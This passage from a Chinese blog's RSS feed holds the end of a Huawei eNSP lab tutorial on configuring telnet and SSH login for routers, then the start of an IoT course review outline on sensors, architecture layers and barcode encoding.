&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei level 3 password cipher abc123
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei privilege level 3 password cipher 123456
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;设置哪些服务可以通过此test用户进行验证，设置telnet 服务&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei service-type http ssh telnet web
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei privilege level 3	//远程登录时能够使用的级别命令
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;实际操作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei] user-interface vty 0 4	//配置0-4五个终端
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] authentication-mode aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] user privilege level 3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei level 3 password cipher abc123
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user huawei service-type http ssh telnet web
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在centOS7上安装telnet所需组件之后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105484-1182022682.png&#34;
	width=&#34;646&#34;
	height=&#34;305&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105484-1182022682_hu688177434353125127.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105484-1182022682_hu17800852877751502466.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622093257810&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;508px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;3a认证设置&#34;&gt;3A认证设置
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105992-1122719151.png&#34;
	width=&#34;662&#34;
	height=&#34;381&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105992-1122719151_hu17953267164647505317.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105992-1122719151_hu2766888054297434756.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622085244141&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;173&#34;
		data-flex-basis=&#34;417px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssh连接&#34;&gt;SSH连接
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user zhangsan password cipher abc123 privilege level 3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-aaa]local-user zhangsan service-type ssh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]ssh user huawei authentication-type password*********
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]stelnet server enable **********
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]rsa local-key-pair create 	//生成密钥对信息，可省略。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]user-interface vty 0 4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4]authentication-mode aaa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4]protocol inbound ssh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;总结&#34;&gt;总结：
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;路由器和交换机的作用？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;交换机：汇聚能力，相同网段通信&lt;/p&gt;
&lt;p&gt;路由器：实现不同网段通信&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为什么我们需要不同网段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不划网段，广播信号浪费资源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路由器的远程连接认证配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络设备常见连接协议：telnet、ssh/stelnet、web&lt;/p&gt;
</description>
        </item>
        <item>
        <title>物联网复习提纲</title>
        <link>https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</link>
        <pubDate>Sun, 19 Jun 2022 07:16:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</guid>
        <description>&lt;h1 id=&#34;物联网复习提纲&#34;&gt;物联网复习提纲
&lt;/h1&gt;&lt;blockquote&gt;
&lt;h1 id=&#34;他郑重地说了看看课后题&#34;&gt;他郑重地说了：“看看课后题。”
&lt;/h1&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 原文档非markdown格式，本文排版问题暂未修复。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 本课程复习提纲由我和@cheerg一起完成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 复习资料为《物联网技术原理》&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第一章p22&#34;&gt;第一章p22
&lt;/h1&gt;&lt;h2 id=&#34;物联网的体系架构各层的功能及关键技术&#34;&gt;物联网的体系架构、各层的功能及关键技术
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;物联网三层体系结构&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;感知控制层：承担物体的标识、信息的采集和远程的控制。&lt;/li&gt;
&lt;li&gt;数据传输层：承担各类设备的网络接入以及信息的传输。&lt;/li&gt;
&lt;li&gt;数据处理层：完成信息的分析处理和决策。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;各层的功能及关键技术&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;感知控制层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;物联网的核心层，主要用于物品标识和信息的智能采集。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由【基本的感应器件】和【感应器组成的网络】两大部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653.png&#34;
	width=&#34;485&#34;
	height=&#34;383&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653_hu10263591739782148005.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653_hu5699055121971467158.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150903301&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;传感器技术&lt;/strong&gt;：把物理量转化为计算机能识别和处理的数字量的一种技术&lt;strong&gt;条形码技术****RFID技术&lt;/strong&gt;：射频识别，通过无线电信号识别特定目标并读写相关数据&lt;strong&gt;EPC技术&lt;/strong&gt;：电子产品代码，为每个产品提供唯一的电子标识符&lt;strong&gt;移动定位技术&lt;/strong&gt;：通过与多个已知坐标位置的固定基站交互，获得启动目标在空间中的技术&lt;strong&gt;无线传感器网络&lt;/strong&gt;：分布式传感网络&lt;strong&gt;物联网控制技术&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据传输层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;主要完成接入和传输功能，是进行信息交换、传递的数据通路。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由【接入网】和【传输网】两部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;传输网由公网与专网组成，样例：电信网、广电网、互联网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接入网包括：光纤接入、无线接入、以太网接入，卫星接入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677.png&#34;
	width=&#34;351&#34;
	height=&#34;386&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677_hu7468320594995887088.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677_hu14230738314758837320.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150909863&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;90&#34;
		data-flex-basis=&#34;218px&#34;
	
&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;短距离无线通信技术长距离无线通信技术有线通信技术&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;数据处理层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;由【业务支撑平台】、【网络管理平台】、【信息处理平台】、【服务支撑平台】等组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键技术：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457.png&#34;
	width=&#34;331&#34;
	height=&#34;374&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457_hu8795604759089523796.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457_hu4894776304153626018.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150914519&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;88&#34;
		data-flex-basis=&#34;212px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;第二章&#34;&gt;第二章
&lt;/h1&gt;&lt;h2 id=&#34;传感器的组成和各模块的功能&#34;&gt;传感器的组成和各模块的功能
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;传感器的概念：能感受规定的被测量的信息，并按照一定规律转换成可用信号的器件或装置，通常由敏感元件、转换元件和转换电路等组成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;敏感元件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：能直接感受或响应被测量，并输出与被测量物体成确定关系的某一物理量的元件。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转换元件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：以敏感元件的输出作为输入，将敏感元件感受或响应的被测量转换成适于传输或测量的电信号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转换电路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：将转换元件输出的电路参数转换为一定范围内的电量输出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;传感器的特性性能指标和物理意义&#34;&gt;传感器的特性（性能指标和物理意义）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**[P34]**静态特性：被测量的值处于稳定状态时的输入/输出关系。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态特性的重要指标：
&lt;ul&gt;
&lt;li&gt;线性度、灵敏度、迟滞性、重复性、量程、其他特性（分辨率、阈值、稳定性、漂移）（有印象就行，概念不用背）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**[P38]**动态特性：其输出对随时间变化的输入量的响应特性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态响应特性分为：稳态响应特性和瞬态响应特性&lt;/li&gt;
&lt;li&gt;动态特性往往从时域和频域两方面分析：
&lt;ul&gt;
&lt;li&gt;时域响应和时域性能指标&lt;/li&gt;
&lt;li&gt;频域响应和频域性能指标&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;电阻应变式电感式和电容式传感器的工作原理基本的公式推导&#34;&gt;电阻应变式、电感式和电容式传感器的工作原理（基本的公式推导）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;电阻应变效应原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理：将电阻应变片粘贴到各种弹性敏感元件上，通过电阻应变片将应变转换为电阻变化。&lt;/li&gt;
&lt;li&gt;公式推导：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051.png&#34;
	width=&#34;846&#34;
	height=&#34;909&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051_hu2138391237415124933.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051_hu17271113943424629792.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150936690&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;93&#34;
		data-flex-basis=&#34;223px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;电感式传感器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理：利用线圈自感或互感系数的变化来实现非电量电测的一种装置。&lt;/li&gt;
&lt;li&gt;公式推导：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208.png&#34;
	width=&#34;881&#34;
	height=&#34;903&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208_hu10422754981296869469.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208_hu3254327144415742829.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150952453&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;97&#34;
		data-flex-basis=&#34;234px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;电容式传感器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;原理：以各种类型的电容器作为敏感元件，将被测物理量的变化转化为电容量的变化，再由转换电路转换为电压、电流或频率。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变极距型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808.png&#34;
	width=&#34;883&#34;
	height=&#34;649&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808_hu8682324158003243860.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808_hu14400985546357328642.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151019109&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;136&#34;
		data-flex-basis=&#34;326px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变面积型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437.png&#34;
	width=&#34;883&#34;
	height=&#34;758&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437_hu7871553331500396787.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437_hu14043981159081773308.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151004290&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变介质型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517.png&#34;
	width=&#34;883&#34;
	height=&#34;393&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517_hu9505633593451082058.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517_hu14129969533238113100.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151010474&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;539px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第三章&#34;&gt;第三章
&lt;/h1&gt;&lt;h2 id=&#34;1p75一维条形码的组成模块单元符号和扫码原理&#34;&gt;1.[P75]一维条形码的组成(模块、单元、符号)和扫码原理。
&lt;/h2&gt;&lt;p&gt;一维条形码是集条形码理论、光电技术、计算机技术、通信技术、条形码印制技术于一体的一种自动识别技术。&lt;/p&gt;
&lt;p&gt;构成条形码的基本单位是模块，模块是指条码中最窄的条或空，模块的宽度通常以mm或mil (1/1000in) 为单位。构成条码的一个条或空称为一个单元，一个单元包含的模块数是由编码方式决定的。&lt;/p&gt;
&lt;p&gt;扫码原理：条形码的扫描需要用到扫描器，扫描器利用自身光源照射条形码，再利用光电转换器接受反射的光线，将反射光线的明暗转换成数字信号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673.png&#34;
	width=&#34;913&#34;
	height=&#34;301&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673_hu11522051266140797148.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673_hu7541844624652630169.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151024667&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;303&#34;
		data-flex-basis=&#34;727px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;2p78二五条码交叉二五条码和三九条码的编码规则&#34;&gt;2.[P78]二五条码、交叉二五条码和三九条码的编码规则。
&lt;/h2&gt;&lt;p&gt;二五条码（最简单的条码）：是一种只有条表示信息的非连续型条码，每个字符由五个条组成，其中两个宽条，三个窄条，字符间隔是窄空，字符集为数字0~9。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346.png&#34;
	width=&#34;913&#34;
	height=&#34;174&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346_hu16913521242681158796.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346_hu15080272457069440723.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151028313&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;524&#34;
		data-flex-basis=&#34;1259px&#34;
	
